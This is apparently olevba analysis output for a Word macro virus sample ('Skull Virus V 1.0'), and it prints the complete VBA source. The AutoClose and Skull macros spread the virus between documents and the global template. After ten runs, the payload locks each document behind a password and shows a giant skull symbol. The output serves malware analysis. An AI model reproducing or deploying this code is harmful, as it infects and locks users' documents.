olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Appder.c-4911bf40594b59b520305f1d1b120559e0dd7641
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Appder.c-4911bf40594b59b520305f1d1b120559e0dd7641 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Appder.c-4911bf40594b59b520305f1d1b120559e0dd7641 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Quit
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Skull", sTMacro$
sTMacro$ = sMe$ + ":Skull"
WordBasic.MacroCopy "Global:Skull", sTMacro$
sTMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "Global:AutoClose", sTMacro$
WordBasic.FileSaveAs dlg
GoTo Done
Quit:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Skull.bas 
in file: Virus.MSWord.Appder.c-4911bf40594b59b520305f1d1b120559e0dd7641 - OLE stream: 'Macros/VBA/Skull'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim AClose
Dim Ad
Dim sMe$
Dim sMacro$
Rem Skull Virus V 1.0
Ignition
On Error GoTo -1: On Error GoTo Quit
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "AutoClose" Then
        AClose = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "Skull" Then
        Ad = -1
    End If
Next i
If Not AClose And Not Ad Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":Skull"
    WordBasic.MacroCopy sMacro$, "Global:Skull"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:AutoClose"
End If
Quit:
End Sub


Private Sub Ignition()
Dim WOpen$
Dim sales
On Error Resume Next
WOpen$ = WordBasic.[GetPrivateProfileString$]("windows", "Counter", "WIN.INI")
sales = WordBasic.Val(WOpen$) + 1
WordBasic.SetPrivateProfileString "windows", "Counter", Str(sales), "WIN.INI"
If sales > 10 Then
    If WordBasic.DocumentProtection() = 0 Then
        WordBasic.InsertSymbol Font:="Wingdings", CharNum:="78"
        WordBasic.InsertPara
        WordBasic.LineUp 1
        WordBasic.CharRight 2, 1
        WordBasic.FontSize 650
        WordBasic.CenterPara
        WordBasic.FormatBordersAndShading ApplyTo:=0, Shadow:=0, TopBorder:=0, LeftBorder:=0, BottomBorder:=0, RightBorder:=0, HorizBorder:=0, VertBorder:=0, TopColor:=0, LeftColor:=0, BottomColor:=0, RightColor:=0, HorizColor:=0, VertColor:=0, FromText:="1 pt", Shading:=0, Foreground:=8, Background:=1, Tab:="1", FineShading:=-1
        WordBasic.CharRight 1
        WordBasic.InsertBreak Type:=2
        WordBasic.ViewPage
        WordBasic.ViewZoom FullPage:=1
        WordBasic.ToolsProtectSection Section:=1, Protect:=1
        WordBasic.ToolsProtectSection Section:=2, Protect:=0
        WordBasic.ToolsProtectDocument DocumentPassword:="Skull", NoReset:=0, Type:=2
        WordBasic.PageUp
    End If
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

